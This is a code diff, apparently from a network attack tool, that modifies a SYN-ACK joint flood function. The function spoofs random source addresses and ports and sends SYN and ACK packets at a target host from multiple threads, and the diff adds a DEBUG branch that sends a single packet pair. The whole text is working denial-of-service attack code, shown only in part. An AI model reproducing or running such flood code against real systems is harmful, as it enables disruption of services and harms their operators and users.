@@ -208,10 +208,15 @@ static void _attack_thread(pSFTP parameters)
     char *daddr = parameters->daddr;
     int dport = parameters->dport;
     // int rep = parameters->rep;
-    /*
-     * every ip's repeat times be small
-     */
+    // every ip's repeat times be small (because this is syn ack joint attack)
 
+#ifdef DEBUG
+    char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
+    saddr = randip(&saddr);
+    int sport = randport();
+    _send_syn_packet(daddr, dport, saddr, sport, 4);
+    _send_ack_packet(daddr, dport, saddr, sport, 4);
+#else
     if (parameters->random_saddr)
     {
         char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
@@ -235,6 +240,7 @@ static void _attack_thread(pSFTP parameters)
             _send_ack_packet(daddr, dport, saddr, sport, 4);
         }
     }
+#endif
 }
 
 int syn_ack_joint_flood_attack(char *url, int port, ...)
@@ -274,9 +280,11 @@ int syn_ack_joint_flood_attack(char *url, int port, ...)
     parameters->saddr = saddr;
     parameters->sport = sport;
 
+#ifndef DEBUG
     pthread_t tid_list[thread_number];
     pthread_attr_t attr;
     int ret;
+#endif
 
     if (strlen(url))
     {
@@ -290,7 +298,11 @@ int syn_ack_joint_flood_attack(char *url, int port, ...)
         error("please specify a target port");
     }
 
-    for (i = 0; i < thread_number; i++) // only one process
+#ifdef DEBUG
+    thread_number++; // meaningless operation, just to avoid warnings from gcc compilation
+    _attack_thread(parameters);
+#else
+    for (i = 0; i < thread_number; i++)
     {
         if (pthread_attr_init(&attr))
         {
@@ -315,6 +327,6 @@ int syn_ack_joint_flood_attack(char *url, int port, ...)
     {
         pthread_join(tid_list[i], NULL);
     }
-
+#endif
     return 0;
 }
